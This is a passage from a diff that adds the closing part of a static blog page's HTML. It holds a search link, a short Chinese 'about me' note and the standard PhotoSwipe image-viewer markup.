+              <a href="http://ibruce.info/2013/11/26/markdown/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>markdown</a>
+            </li>
+          
+        </ul>
+  		
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-me" q-show="aboutme">
+  	  	
+  	  		<div class="aboutme-wrap" id="js-aboutme">很惭愧&lt;br&gt;&lt;br&gt;blog更新比较慢&lt;br&gt;谢谢大家</div>
+  	  	
+    	</section>
+    
+  </div>
+  
+</div>
+    <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+  </div>
+</body>
+</html>
